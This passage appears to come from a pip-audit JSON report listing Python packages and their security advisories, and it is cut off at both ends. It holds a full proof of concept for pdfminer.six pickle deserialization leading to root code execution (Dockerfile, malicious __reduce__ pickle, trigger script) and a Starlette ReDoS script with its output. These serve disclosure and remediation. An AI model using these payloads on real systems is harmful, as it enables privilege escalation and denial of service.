exploitable through local privilege escalation due to continued unsafe use of pickle files. The **Dockerfile** is hence modified to run test against this claim.  This demonstrates that the patch for **CVE-2025-64512** is incomplete: the vulnerability remains exploitable. This advisory therefore documents a distinct, independently fixable flaw. A correct remediation must remove the dependency on pickle files (or otherwise eliminate unsafe deserialization) and replace it with a safe, auditable data-handling approach so the library can operate normally without relying on ```pickle```  ## \ud83d\udcda Table of Contents  - [\ud83d\udd0d Background](#-background) - [\ud83d\udc0d Vulnerability Description](#-vulnerability-description) - [\ud83c\udfad Demo Scenario](#-demo-scenario) - [\ud83e\udde8 Technical Details](#-technical-details) - [\ud83d\udd27 Setup and Usage](#-setup-and-usage) - [\ud83d\udcdd Step-by-step Walkthrough](#-step-by-step-walkthrough) - [\ud83d\udee1\ufe0f Security Standards & References](#-security-standards--references) ---  ## \ud83d\udd0d Background  **pdfminer.six** is a popular Python library for extracting text and information from PDF files. It supports CJK (Chinese, Japanese, Korean) fonts via external CMap files, which it loads from disk using Python's `pickle` module.  > \ud83d\udc0d **Security Issue:** > If the CMap search path (`CMAP_PATH` or default directories) includes a world-writable or user-writable directory, an attacker can place a malicious `.pickle.gz` file that will be loaded and deserialized by pdfminer.six, leading to arbitrary code execution.  ---  ### \ud83d\udc0d Vulnerability Description  - **Component:** pdfminer.six CMap loading (`pdfminer/cmapdb.py`) - **Issue:** Loads and deserializes `.pickle.gz` files using Python\u2019s `pickle` module, which is unsafe for untrusted data. - **Exploitability:** If a low-privileged user can write to any directory in `CMAP_PATH`, they can execute code as the user running pdfminer\u2014potentially root or a privileged service. - **Impact:** Full code execution as the service user, privilege escalation from user to root, persistence, and potential lateral movement.  ![line](https://user-images.githubusercontent.com/74038190/212284100-561aa473-3905-4a80-b561-0d28506553ee.gif) ### \ud83c\udfad Demo Scenario  **Environment:** - \ud83d\udc27 Alpine Linux (Docker container) - \ud83d\udc68\u200d\ud83d\udcbb Two users:   - `user1` (attacker: low-privilege)   - `root` (victim: runs privileged PDF-processing script) - \ud83d\uddc2\ufe0f Shared writable directory: `/tmp/uploads` - \ud83d\udee3\ufe0f `CMAP_PATH` set to `/tmp/uploads` for the privileged script - \ud83d\udce6 pdfminer.six installed system-wide  **Attack Flow:** 1. \ud83d\udd75\ufe0f\u200d\u2642\ufe0f `user1` creates a malicious CMap file (`Evil.pickle.gz`) in `/tmp/uploads`. 2. \ud83d\udc51 The privileged service (`root`) processes a PDF or calls `get_cmap(\"Evil\")`. 3. \ud83d\udca3 The malicious pickle is deserialized, running arbitrary code as root. 4. \ud83c\udfaf The exploit creates a flag file in `/root/pwnedByPdfminer` as proof.  ![line](https://user-images.githubusercontent.com/74038190/212284100-561aa473-3905-4a80-b561-0d28506553ee.gif)  ### \ud83e\udde8 Technical Details  - **Vulnerability Type:** Insecure deserialization of untrusted data using Python's `pickle` - **Attack Prerequisites:** Attacker can write to a directory included in `CMAP_PATH` - **Vulnerable Line:**   ```python   return type(str(name), (), pickle.loads(gzfile.read()))   ```   *In `pdfminer/cmapdb.py`'s `_load_data` method* - https://github.com/pdfminer/pdfminer.six/blob/20250506/pdfminer/cmapdb.py#L246 - **Proof of Concept:** See `createEvilPickle.py`, `evilmod.py`, and `processPdf.py`  **Exploit Chain:** - Attacker places a malicious `.pickle.gz` file in the CMap search path. - Privileged process (e.g., root) loads a CMap, triggering pickle deserialization. - Arbitrary code executes with the privilege of the process (root/service account).  ![line](https://user-images.githubusercontent.com/74038190/212284100-561aa473-3905-4a80-b561-0d28506553ee.gif)  ## \ud83d\udd27 Setup and Usage  ### \ud83d\udcc1 Files #### </> Dockerfile ```yml FROM python:3.11-alpine  ARG PM_COMMIT=b808ee05dd7f0c8ea8ec34bdf394d40e63501086  # Install git and build tooling RUN apk add --no-cache git build-base  WORKDIR /opt  # Clone pdfminer.six and check out the specific commit, then install from source RUN git clone https://github.com/pdfminer/pdfminer.six.git && \\     cd pdfminer.six && \\     git fetch --all && \\     git checkout ${PM_COMMIT} && \\     pip install --no-cache-dir -e .  # App working directory for PoC WORKDIR /app  # Create low-privilege user and uploads dir RUN adduser -D user1 && \\     mkdir -p /tmp/uploads && \\     chown user1:user1 /tmp/uploads && \\     chmod 1777 /tmp/uploads  # Copy PoC files COPY evilmod.py /app/evilmod.py COPY createEvilPickle.py /app/createEvilPickle.py COPY processPDF.py /app/processPDF.py  ENV CMAP_PATH=/tmp/uploads ENV PYTHONUNBUFFERED=1  # Keep the container running in background so you can exec into it anytime. CMD [\"tail\", \"-f\", \"/dev/null\"]  ```  #### </> evilmod.py ```python import os  def evilFunc():     with open(\"/root/pwnedByPdfminer\", \"w\") as f:         f.write(\"ROOTED by pdfminer pickle RCE\\n\")     return {\"CODE2CID\": {}, \"IS_VERTICAL\": False} ``` #### </> createEvilPickle.py ```python import pickle import gzip from evilmod import evilFunc  class Evil:     def __reduce__(self):         return (evilFunc, ())  payload = pickle.dumps(Evil()) with gzip.open(\"/tmp/uploads/Evil.pickle.gz\", \"wb\") as f:     f.write(payload)  print(\"Malicious pickle created at /tmp/uploads/Evil.pickle.gz\") ``` #### </> processPDF.py ```python import os from pdfminer.cmapdb import CMapDB  os.environ[\"CMAP_PATH\"] = \"/tmp/uploads\"  CMapDB.get_cmap(\"Evil\")  print(\"CMap loaded. If vulnerable, /root/pwnedByPdfminer will be created.\") ``` ![line](https://user-images.githubusercontent.com/74038190/212284100-561aa473-3905-4a80-b561-0d28506553ee.gif)  ### 1\ufe0f\u20e3 Build and start the demo container  ```bash docker build -t pdfminer-priv-esc-demo . docker run --rm -it --name pdfminer-demo pdfminer-priv-esc-democ ```  ### 2\ufe0f\u20e3 In the container, open two shells in parallel (or switch users in one):  #### \ud83d\udd75\ufe0f\u200d\u2642\ufe0f Shell 1 (Attacker: user1) ```bash su user1 cd /app python createEvilPickle.py # \u2705 Confirms: /tmp/uploads/Evil.pickle.gz is created and owned by user1 ```  #### \ud83d\udc51 Shell 2 (Victim: root) ```bash cd /app python processPdf.py # \ud83c\udfaf Output: If vulnerable, /root/pwnedByPdfminer will be created ```  ### 3\ufe0f\u20e3 Proof of escalation  ```bash cat /root/pwnedByPdfminer # \ud83c\udff4 Output: ROOTED by pdfminer pickle RCE ```  <img width=\"815\" height=\"889\" alt=\"proof-of-exploit\" src=\"https://github.com/user-attachments/assets/f465d17c-a3af-49c5-9dbc-eec9635b36fc\" />  ![line](https://user-images.githubusercontent.com/74038190/212284100-561aa473-3905-4a80-b561-0d28506553ee.gif)  ## \ud83d\udcdd Step-by-step Walkthrough  1. **user1** uses `createEvilPickle.py` to craft and place a malicious CMap pickle in a shared upload directory. 2. The **root** user runs a typical PDF-processing script, which loads CMap files from that directory. 3. The exploit triggers, running arbitrary code as root. 4. The attacker now has proof of code execution as root (and, in a real attack, could escalate further).  ![line](https://user-images.githubusercontent.com/74038190/212284100-561aa473-3905-4a80-b561-0d28506553ee.gif)  ## \ud83d\udee1\ufe0f Security Standards & References  - **CVSS (Common Vulnerability Scoring System):**   - **Base Score:** 7.8 (High)   - **Vector:** `AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`  - **OWASP Top 10:**   - [A08:2021 - Software and Data Integrity Failures](https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/)   - [A03:2021 - Injection](https://owasp.org/Top10/A03_2021-Injection/) (by analogy, as it's code injection via deserialization)  - **MITRE CWE References:**   - [CWE-502: Deserialization of Untrusted Data](https://cwe.mitre.org/data/definitions/502.html)   - [CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes](https://cwe.mitre.org/data/definitions/915.html)  - **MITRE ATT&CK Techniques:**   - [T1055: Process Injection](https://attack.mitre.org/techniques/T1055/)   - [T1548: Abuse Elevation Control Mechanism](https://attack.mitre.org/techniques/T1548/)"}]}, {"name": "pdfplumber", "version": "0.11.7", "vulns": []}, {"name": "peewee", "version": "3.18.3", "vulns": []}, {"name": "pexpect", "version": "4.9.0", "vulns": []}, {"name": "pickleshare", "version": "0.7.5", "vulns": []}, {"name": "pillow", "version": "11.3.0", "vulns": []}, {"name": "pip", "version": "25.1.1", "vulns": [{"id": "GHSA-4xh5-x5gv-qwph", "fix_versions": ["25.3"], "aliases": ["CVE-2025-8869"], "description": "### Summary  In the fallback extraction path for source distributions, `pip` used Python\u2019s `tarfile` module without verifying that symbolic/hard link targets resolve inside the intended extraction directory. A malicious sdist can include links that escape the target directory and overwrite arbitrary files on the invoking host during `pip install`.  ### Impact  Successful exploitation enables arbitrary file overwrite outside the build/extraction directory on the machine running `pip`. This can be leveraged to tamper with configuration or startup files and may lead to further code execution depending on the environment, but the direct, guaranteed impact is integrity compromise on the vulnerable system.  ### Conditions  The issue is triggered when installing an attacker-controlled sdist (e.g., from an index or URL) and the fallback extraction code path is used. No special privileges are required beyond running `pip install`; active user action is necessary.  ### Remediation  The [fix](https://github.com/pypa/pip/pull/13550) is available starting in pip `25.3`. Using a Python interpreter that implements the safe-extraction behavior described by **PEP 706** provides additional defense in depth for other `tarfile` issues but is not a substitute for upgrading pip for this specific flaw."}]}, {"name": "pip-api", "version": "0.0.34", "vulns": []}, {"name": "pip-audit", "version": "2.9.0", "vulns": []}, {"name": "pip-requirements-parser", "version": "32.0.1", "vulns": []}, {"name": "pkginfo", "version": "1.12.1.2", "vulns": []}, {"name": "platformdirs", "version": "4.3.8", "vulns": []}, {"name": "playwright", "version": "1.55.0", "vulns": []}, {"name": "plotly", "version": "6.3.1", "vulns": []}, {"name": "pluggy", "version": "1.6.0", "vulns": []}, {"name": "poetry", "version": "2.2.1", "vulns": []}, {"name": "poetry-core", "version": "2.2.1", "vulns": []}, {"name": "polars", "version": "1.34.0", "vulns": []}, {"name": "polars-runtime-32", "version": "1.34.0", "vulns": []}, {"name": "polyfactory", "version": "2.22.3", "vulns": []}, {"name": "portalocker", "version": "2.7.0", "vulns": []}, {"name": "posthog", "version": "5.4.0", "vulns": []}, {"name": "pre-commit", "version": "4.3.0", "vulns": []}, {"name": "preshed", "version": "3.0.10", "vulns": []}, {"name": "prometheus-client", "version": "0.23.1", "vulns": []}, {"name": "prompt-toolkit", "version": "3.0.52", "vulns": []}, {"name": "propcache", "version": "0.4.0", "vulns": []}, {"name": "proto-plus", "version": "1.26.1", "vulns": []}, {"name": "protobuf", "version": "6.32.1", "vulns": []}, {"name": "psutil", "version": "7.1.3", "vulns": []}, {"name": "psycopg2-binary", "version": "2.9.10", "vulns": []}, {"name": "ptyprocess", "version": "0.7.0", "vulns": []}, {"name": "pure-eval", "version": "0.2.3", "vulns": []}, {"name": "py", "version": "1.11.0", "vulns": [{"id": "PYSEC-2022-42969", "fix_versions": [], "aliases": ["CVE-2022-42969", "GHSA-w596-4wvx-j9j6"], "description": "The py library through 1.11.0 for Python allows remote attackers to conduct a ReDoS (Regular expression Denial of Service) attack via a Subversion repository with crafted info data, because the InfoSvnCommand argument is mishandled."}]}, {"name": "py-serializable", "version": "2.1.0", "vulns": []}, {"name": "pyarrow", "version": "21.0.0", "vulns": []}, {"name": "pyasn1", "version": "0.6.1", "vulns": []}, {"name": "pyasn1-modules", "version": "0.4.2", "vulns": []}, {"name": "pybase64", "version": "1.4.2", "vulns": []}, {"name": "pyclipper", "version": "1.3.0.post6", "vulns": []}, {"name": "pycosat", "version": "0.6.6", "vulns": []}, {"name": "pycparser", "version": "2.22", "vulns": []}, {"name": "pycryptodome", "version": "3.23.0", "vulns": []}, {"name": "pydantic", "version": "2.12.4", "vulns": []}, {"name": "pydantic-core", "version": "2.41.5", "vulns": []}, {"name": "pydantic-settings", "version": "2.11.0", "vulns": []}, {"name": "pydeck", "version": "0.9.1", "vulns": []}, {"name": "pydotplus", "version": "2.0.2", "vulns": []}, {"name": "pyee", "version": "13.0.0", "vulns": []}, {"name": "pygments", "version": "2.19.2", "vulns": []}, {"name": "pyjwt", "version": "2.10.1", "vulns": []}, {"name": "pylatexenc", "version": "2.10", "vulns": []}, {"name": "pylint", "version": "4.0.2", "vulns": []}, {"name": "pymdown-extensions", "version": "10.16.1", "vulns": []}, {"name": "pymupdf", "version": "1.26.5", "vulns": []}, {"name": "pyobjc-core", "version": "12.0", "vulns": []}, {"name": "pyobjc-framework-cocoa", "version": "12.0", "vulns": []}, {"name": "pyobjc-framework-coreml", "version": "12.0", "vulns": []}, {"name": "pyobjc-framework-quartz", "version": "12.0", "vulns": []}, {"name": "pyobjc-framework-vision", "version": "12.0", "vulns": []}, {"name": "pyotp", "version": "2.9.0", "vulns": []}, {"name": "pyparsing", "version": "3.2.5", "vulns": []}, {"name": "pypdf", "version": "5.9.0", "vulns": [{"id": "GHSA-7hfw-26vp-jp8m", "fix_versions": ["6.0.0"], "aliases": ["CVE-2025-55197"], "description": "### Impact An attacker who uses this vulnerability can craft a PDF which leads to the RAM being exhausted. This requires just reading the file if a series of FlateDecode filters is used on a malicious cross-reference stream. Other content streams are affected on explicit access.  ### Patches This has been fixed in [pypdf==6.0.0](https://github.com/py-pdf/pypdf/releases/tag/6.0.0).  ### Workarounds If you cannot upgrade yet, you might want to implement the workaround for `pypdf.filters.decompress` yourself: https://github.com/py-pdf/pypdf/blob/0dd57738bbdcdb63f0fb43d8a6b3d222b6946595/pypdf/filters.py#L72-L143  ### References This issue has been reported in #3429 and fixed in #3430."}, {"id": "GHSA-vr63-x8vc-m265", "fix_versions": ["6.1.3"], "aliases": ["CVE-2025-62707"], "description": "### Impact  An attacker who uses this vulnerability can craft a PDF which leads to an infinite loop. This requires parsing the content stream of a page which has an inline image using the DCTDecode filter.  ### Patches This has been fixed in [pypdf==6.1.3](https://github.com/py-pdf/pypdf/releases/tag/6.1.3).  ### Workarounds If you cannot upgrade yet, consider applying the changes from PR [#3501](https://github.com/py-pdf/pypdf/pull/3501)."}, {"id": "GHSA-jfx9-29x2-rv3j", "fix_versions": ["6.1.3"], "aliases": ["CVE-2025-62708"], "description": "### Impact  An attacker who uses this vulnerability can craft a PDF which leads to large memory usage. This requires parsing the content stream of a page using the LZWDecode filter.  ### Patches This has been fixed in [pypdf==6.1.3](https://github.com/py-pdf/pypdf/releases/tag/6.1.3).  ### Workarounds If you cannot upgrade yet, consider applying the changes from PR [#3502](https://github.com/py-pdf/pypdf/pull/3502)."}]}, {"name": "pypdf2", "version": "3.0.1", "vulns": []}, {"name": "pypdfium2", "version": "4.30.0", "vulns": []}, {"name": "pypika", "version": "0.48.9", "vulns": []}, {"name": "pyproject-hooks", "version": "1.2.0", "vulns": []}, {"name": "pyresparser", "version": "1.0.6", "vulns": []}, {"name": "pyrsistent", "version": "0.20.0", "vulns": []}, {"name": "pysocks", "version": "1.7.1", "vulns": []}, {"name": "pytesseract", "version": "0.3.13", "vulns": []}, {"name": "pytest", "version": "8.4.2", "vulns": []}, {"name": "pytest-asyncio", "version": "1.2.0", "vulns": []}, {"name": "pytest-cov", "version": "7.0.0", "vulns": []}, {"name": "pytest-mock", "version": "3.15.1", "vulns": []}, {"name": "python-dateutil", "version": "2.9.0.post0", "vulns": []}, {"name": "python-docx", "version": "1.2.0", "vulns": []}, {"name": "python-dotenv", "version": "1.2.1", "vulns": []}, {"name": "python-engineio", "version": "4.12.3", "vulns": []}, {"name": "python-http-client", "version": "3.3.7", "vulns": []}, {"name": "python-jose", "version": "3.5.0", "vulns": []}, {"name": "python-json-logger", "version": "2.0.7", "vulns": []}, {"name": "python-magic", "version": "0.4.27", "vulns": []}, {"name": "python-multipart", "version": "0.0.20", "vulns": []}, {"name": "python-pptx", "version": "1.0.2", "vulns": []}, {"name": "python-socketio", "version": "5.14.2", "vulns": []}, {"name": "pytokens", "version": "0.2.0", "vulns": []}, {"name": "pytz", "version": "2025.2", "vulns": []}, {"name": "pyvis", "version": "0.3.2", "vulns": []}, {"name": "pyyaml", "version": "6.0.3", "vulns": []}, {"name": "pyzmq", "version": "27.1.0", "vulns": []}, {"name": "qrcode", "version": "8.2", "vulns": []}, {"name": "rapidfuzz", "version": "3.14.3", "vulns": []}, {"name": "rapidocr", "version": "3.4.2", "vulns": []}, {"name": "redis", "version": "6.4.0", "vulns": []}, {"name": "referencing", "version": "0.37.0", "vulns": []}, {"name": "regex", "version": "2025.11.3", "vulns": []}, {"name": "reportlab", "version": "4.4.4", "vulns": []}, {"name": "requests", "version": "2.32.5", "vulns": []}, {"name": "requests-oauthlib", "version": "2.0.0", "vulns": []}, {"name": "requests-toolbelt", "version": "1.0.0", "vulns": []}, {"name": "retry", "version": "0.9.2", "vulns": []}, {"name": "rfc3339-validator", "version": "0.1.4", "vulns": []}, {"name": "rfc3986-validator", "version": "0.1.1", "vulns": []}, {"name": "rfc3987-syntax", "version": "1.1.0", "vulns": []}, {"name": "rich", "version": "14.2.0", "vulns": []}, {"name": "rpds-py", "version": "0.28.0", "vulns": []}, {"name": "rsa", "version": "4.9.1", "vulns": []}, {"name": "rtree", "version": "1.4.1", "vulns": []}, {"name": "ruamel-yaml", "version": "0.18.14", "vulns": []}, {"name": "ruamel-yaml-clib", "version": "0.2.8", "vulns": []}, {"name": "ruff", "version": "0.13.3", "vulns": []}, {"name": "s3transfer", "version": "0.14.0", "vulns": []}, {"name": "safetensors", "version": "0.6.2", "vulns": []}, {"name": "safety", "version": "3.7.0", "vulns": []}, {"name": "safety-schemas", "version": "0.0.16", "vulns": []}, {"name": "scikit-image", "version": "0.25.2", "vulns": []}, {"name": "scikit-learn", "version": "1.7.2", "vulns": []}, {"name": "scipy", "version": "1.16.3", "vulns": []}, {"name": "seaborn", "version": "0.13.2", "vulns": []}, {"name": "semchunk", "version": "2.2.2", "vulns": []}, {"name": "send2trash", "version": "1.8.3", "vulns": []}, {"name": "sendgrid", "version": "6.12.5", "vulns": []}, {"name": "sentence-transformers", "version": "5.1.1", "vulns": []}, {"name": "setuptools", "version": "80.9.0", "vulns": []}, {"name": "sgmllib3k", "version": "1.0.0", "vulns": []}, {"name": "shapely", "version": "2.1.2", "vulns": []}, {"name": "shellingham", "version": "1.5.4", "vulns": []}, {"name": "simple-websocket", "version": "1.1.0", "vulns": []}, {"name": "six", "version": "1.17.0", "vulns": []}, {"name": "slack-bolt", "version": "1.26.0", "vulns": []}, {"name": "slack-sdk", "version": "3.37.0", "vulns": []}, {"name": "smart-open", "version": "7.4.3", "vulns": []}, {"name": "smmap", "version": "5.0.2", "vulns": []}, {"name": "sniffio", "version": "1.3.1", "vulns": []}, {"name": "sortedcontainers", "version": "2.4.0", "vulns": []}, {"name": "soupsieve", "version": "2.8", "vulns": []}, {"name": "spacy", "version": "3.8.7", "vulns": []}, {"name": "spacy-legacy", "version": "3.0.12", "vulns": []}, {"name": "spacy-loggers", "version": "1.0.5", "vulns": []}, {"name": "sqlalchemy", "version": "2.0.43", "vulns": []}, {"name": "sqlglot", "version": "27.20.0", "vulns": []}, {"name": "sqlglotrs", "version": "0.6.2", "vulns": []}, {"name": "srsly", "version": "2.5.1", "vulns": []}, {"name": "sse-starlette", "version": "3.0.3", "vulns": []}, {"name": "stack-data", "version": "0.6.3", "vulns": []}, {"name": "starlette", "version": "0.48.0", "vulns": [{"id": "GHSA-7f5h-v6xp-fcq8", "fix_versions": ["0.49.1"], "aliases": ["CVE-2025-62727"], "description": "### Summary An unauthenticated attacker can send a crafted HTTP Range header that triggers quadratic-time processing in Starlette's `FileResponse` Range parsing/merging logic. This enables CPU exhaustion per request, causing denial\u2011of\u2011service for endpoints serving files (e.g., `StaticFiles` or any use of `FileResponse`).  ### Details Starlette parses multi-range requests in ``FileResponse._parse_range_header()``, then merges ranges using an O(n^2) algorithm.  ```python # starlette/responses.py _RANGE_PATTERN = re.compile(r\"(\\d*)-(\\d*)\") # vulnerable to O(n^2) complexity ReDoS  class FileResponse(Response):     @staticmethod     def _parse_range_header(http_range: str, file_size: int) -> list[tuple[int, int]]:         ranges: list[tuple[int, int]] = []         try:             units, range_ = http_range.split(\"=\", 1)         except ValueError:             raise MalformedRangeHeader()          # [...]          ranges = [             (                 int(_[0]) if _[0] else file_size - int(_[1]),                 int(_[1]) + 1 if _[0] and _[1] and int(_[1]) < file_size else file_size,             )             for _ in _RANGE_PATTERN.findall(range_) # vulnerable             if _ != (\"\", \"\")         ]  ```  The parsing loop of ``FileResponse._parse_range_header()`` uses the regular expression which vulnerable to denial of service for its O(n^2) complexity. A crafted `Range` header can maximize its complexity.  The merge loop processes each input range by scanning the entire result list, yielding quadratic behavior with many disjoint ranges. A crafted Range header with many small, non-overlapping ranges (or specially shaped numeric substrings) maximizes comparisons.    This affects any Starlette application that uses:    - ``starlette.staticfiles.StaticFiles`` (internally returns `FileResponse`) \u2014 `starlette/staticfiles.py:178`   - Direct ``starlette.responses.FileResponse`` responses  ### PoC ```python #!/usr/bin/env python3  import sys import time  try:     import starlette     from starlette.responses import FileResponse except Exception as e:     print(f\"[ERROR] Failed to import starlette: {e}\")     sys.exit(1)   def build_payload(length: int) -> str:     \"\"\"Build the Range header value body: '0' * num_zeros + '0-'\"\"\"     return (\"0\" * length) + \"a-\"   def test(header: str, file_size: int) -> float:     start = time.perf_counter()     try:         FileResponse._parse_range_header(header, file_size)     except Exception:         pass     end = time.perf_counter()     elapsed = end - start     return elapsed   def run_once(num_zeros: int) -> None:     range_body = build_payload(num_zeros)     header = \"bytes=\" + range_body     # Use a sufficiently large file_size so upper bounds default to file size     file_size = max(len(range_body) + 10, 1_000_000)          print(f\"[DEBUG] range_body length: {len(range_body)} bytes\")     elapsed_time = test(header, file_size)     print(f\"[DEBUG] elapsed time: {elapsed_time:.6f} seconds\\n\")   if __name__ == \"__main__\":     print(f\"[INFO] Starlette Version: {starlette.__version__}\")     for n in [5000, 10000, 20000, 40000]:         run_once(n)  \"\"\" $ python3 poc_dos_range.py [INFO] Starlette Version: 0.48.0 [DEBUG] range_body length: 5002 bytes [DEBUG] elapsed time: 0.053932 seconds  [DEBUG] range_body length: 10002 bytes [DEBUG] elapsed time: 0.209770 seconds  [DEBUG] range_body length: 20002 bytes [DEBUG] elapsed time: 0.885296 seconds  [DEBUG] range_body length: 40002 bytes [DEBUG] elapsed time: 3.238832 seconds \"\"\" ```  ### Impact Any Starlette app serving files via FileResponse or StaticFiles; frameworks built on Starlette (e.g., FastAPI) are indirectly impacted when using file-serving endpoints. Unauthenticated remote attackers can exploit this via a single HTTP request with a crafted Range header."}]}, {"name": "statsmodels", "version": "0.14.5", "vulns": []}, {"name": "stevedore", "version": "5.5.0", "vulns": []}, {"name": "strands-agents", "version": "1.15.0", "vulns": []}, {"name": "strands-agents-tools", "version": "0.2.14", "vulns": []}, {"name": "streamlit", "version": "1.50.0", "vulns": []}, {"name": "structlog", "version": "25.4.0", "vulns": []}, {"name": "sympy", "version": "1.14.0", "vulns": []}, {"name": "tabulate", "version": "0.9.0", "vulns": []}, {"name": "tenacity", "version": "9.1.2", "vulns": []}, {"name": "termcolor", "version": "3.2.0", "vulns": []}, {"name": "terminado", "version": "0.18.1", "vulns": []}, {"name": "textblob", "version": "0.19.0", "vulns": []}, {"name": "thinc", "version": "8.3.6", "vulns": []}, {"name": "threadpoolctl", "version": "3.6.0", "vulns": []}, {"name": "tifffile", "version": "2025.10.4", "vulns": []}, {"name": "tiktoken", "version": "0.11.0", "vulns": []}, {"name": "tinycss2", "version": "1.4.0", "vulns": []}, {"name": "tokenizers", "version": "0.22.1", "vulns": []}, {"name": "toml", "version": "0.10.2", "vulns": []}, {"name": "tomli", "version": "2.2.1", "vulns": []}, {"name": "tomli-w", "version": "1.2.0", "vulns": []}, {"name": "tomlkit", "version": "0.13.3", "vulns": []}, {"name": "toolbox-core", "version": "0.5.2", "vulns": []}, {"name": "toolbox-langchain", "version": "0.5.2", "vulns": []}, {"name": "torch", "version": "2.9.0", "vulns": []}, {"name": "torchvision", "version": "0.24.0", "vulns": []}, {"name": "tornado", "version": "6.5.2", "vulns": []}, {"name": "tqdm", "version": "4.67.1", "vulns": []}, {"name": "traitlets", "version": "5.14.3", "vulns": []}, {"name": "transformers", "version": "4.57.1", "vulns": []}, {"name": "trove-classifiers", "version": "2025.9.11.17", "vulns": []}, {"name": "truststore", "version": "0.10.1", "vulns": []}, {"name": "typer", "version": "0.19.2", "vulns": []}, {"name": "types-awscrt", "version": "0.28.2", "vulns": []}, {"name": "types-pyyaml", "version": "6.0.12.20250915", "vulns": []}, {"name": "types-requests", "version": "2.32.4.20250913", "vulns": []}, {"name": "types-s3transfer", "version": "0.14.0", "vulns": []}, {"name": "typing-extensions", "version": "4.15.0", "vulns": []}, {"name": "typing-inspect", "version": "0.9.0", "vulns": []}, {"name": "typing-inspection", "version": "0.4.2", "vulns": []}, {"name": "typing-utils", "version": "0.1.0", "vulns": []}, {"name": "tzdata", "version": "2025.2", "vulns": []}, {"name": "tzlocal", "version": "5.3.1", "vulns": []}, {"name": "unidecode", "version": "1.4.0", "vulns": []}, {"name": "uri-template", "version": "1.3.0", "vulns": []}, {"name": "uritemplate", "version": "4.2.0", "vulns": []}, {"name": "urllib3", "version": "2.3.0", "vulns": [{"id": "GHSA-48p4-8xcf-vxj5", "fix_versions": ["2.5.0"], "aliases": ["CVE-2025-50182"], "description": "urllib3 [supports](https://urllib3.readthedocs.io/en/2.4.0/reference/contrib/emscripten.html) being used in a Pyodide runtime utilizing the [JavaScript Fetch API](https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API) or falling back on [XMLHttpRequest](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest). This means you can use Python libraries to make HTTP requests from your browser or Node.js. Additionally, urllib3 provides [a mechanism](https://urllib3.readthedocs.io/en/2.4.0/user-guide.html#retrying-requests) to control redirects.  However, the `retries` and `redirect` parameters are ignored with Pyodide; the runtime itself determines redirect behavior.   ## Affected usages  Any code which relies on urllib3 to control the number of redirects for an HTTP request in a Pyodide runtime.   ## Impact  Redirects are often used to exploit SSRF vulnerabilities. An application attempting to mitigate SSRF or open redirect vulnerabilities by disabling redirects may remain vulnerable if a Pyodide runtime redirect mechanism is unsuitable.   ## Remediation  If you use urllib3 in Node.js, upgrade to a patched version of urllib3.  Unfortunately, browsers provide no suitable way which urllib3 can use: `XMLHttpRequest` provides no control over redirects, the Fetch API returns `opaqueredirect` responses lacking data when redirects are controlled manually. Expect default browser behavior for redirects."}, {"id": "GHSA-pq67-6m6q-mj2v", "fix_versions": ["2.5.0"], "aliases": ["CVE-2025-50181"], "description": "urllib3 handles redirects and retries using the same mechanism, which is controlled by the `Retry` object. The most common way to disable redirects is at the request level, as follows:  ```python resp = urllib3.request(\"GET\", \"https://httpbin.org/redirect/1\", redirect=False) print(resp.status) # 302 ```  However, it is also possible to disable redirects, for all requests, by instantiating a `PoolManager` and specifying `retries` in a way that disable redirects:  ```python import urllib3  http = urllib3.PoolManager(retries=0)  # should raise MaxRetryError on redirect http = urllib3.PoolManager(retries=urllib3.Retry(redirect=0))  # equivalent to the above http = urllib3.PoolManager(retries=False)  # should return the first response  resp = http.request(\"GET\", \"https://httpbin.org/redirect/1\") ```  However, the `retries` parameter is currently ignored, which means all the above examples don't disable redirects.  ## Affected usages  Passing `retries` on `PoolManager` instantiation to disable redirects or restrict their number.  By default, requests and botocore users are not affected.  ## Impact  Redirects are often used to exploit SSRF vulnerabilities. An application attempting to mitigate SSRF or open redirect vulnerabilities by disabling redirects at the PoolManager level will remain vulnerable.  ## Remediation  You can remediate this vulnerability with the following steps:   * Upgrade to a patched version of urllib3. If your organization would benefit from the continued support of urllib3 1.x, please contact [sethmichaellarson@gmail.com](mailto:sethmichaellarson@gmail.com) to discuss sponsorship or contribution opportunities.  * Disable redirects at the `request()` level instead of the `PoolManager()` level."}]}, {"name": "uv", "version": "0.8.23", "vulns": [{"id": "GHSA-w476-p2h3-79g9", "fix_versions": ["0.9.5"], "aliases": [], "description": "### Impact  In versions 0.9.4 and earlier of uv, tar archives containing PAX headers with file size overrides were not handled properly. As a result, an attacker could contrive a source distribution (as a tar archive) that would extract differently when installed via uv versus other Python package installers.  The underlying parsing differential here originates with astral-tokio-tar, which disclosed this vulnerability as CVE-2025-62518.  In practice, the impact of this vulnerability is **low**: only source distributions can be formatted as tar archives, and source distributions execute arbitrary code at build/installation time by definition. Consequently, a parser differential in tar extraction is strictly less powerful than the capabilities already exposed to an attacker who has the ability to control source distributions.   However, this particular source of malleability in source distributions is unintentional and not operating by design, and therefore we consider it a vulnerability despite its overlap in capabilities with intended behavior.  ### Patches  Versions 0.9.5 and newer of uv address the vulnerability above. Users should upgrade to 0.9.5 or newer.  ### Workarounds  Users are advised to upgrade to version 0.9.5 or newer to address this advisory.  Users should experience no breaking changes as a result of the patch above.  ### References  * See CVE-2025-62518 for the corresponding advisory against astral-tokio-tar"}, {"id": "GHSA-pqhf-p39g-3x64", "fix_versions": ["0.9.6"], "aliases": [], "description": "### Impact  In versions 0.9.5 and earlier of uv, ZIP archives were handled in a manner that enabled two parsing differentials against other components of the Python packaging ecosystem:  1. Central directory entries in a ZIP archive can contain comment fields. However, uv would assume that these fields were not present, since they aren't widely used. Consequently, a ZIP archive could be constructed where uv would interpret the contents of a central directory comment field as ZIP control structures (such as a new central directory entry), rather than skipping over them. 2. Both local file entries and central directory entries contain filename fields, which are used to place archive members on disk. These fields are arbitrary sequences of bytes, and may therefore be invalid or ambiguous. For example, they may contain ASCII null bytes, in which case different ZIP extractors behave differently: Python's `zipfile` module truncates the filename at the first null, while uv would skip (not extract) any archive members whose filenames contained nulls. Because of this difference, a ZIP archive could be constructed that would extract differently across different Python package installers.  In both cases, the outcome is that an attacker may be able to produce a ZIP with a consistent digest that expands differently with different Python package installers.  Like with GHSA-8qf3-x8v5-2pj8, the impact of these differentials is limited by a number of factors:  - To be compromised via this vulnerability, user interaction of some sort is required. In particular, the user must run `uv pip install $package` or similar with an attacker-controlled $package. When using wheel distributions, installation of the malicious package is not 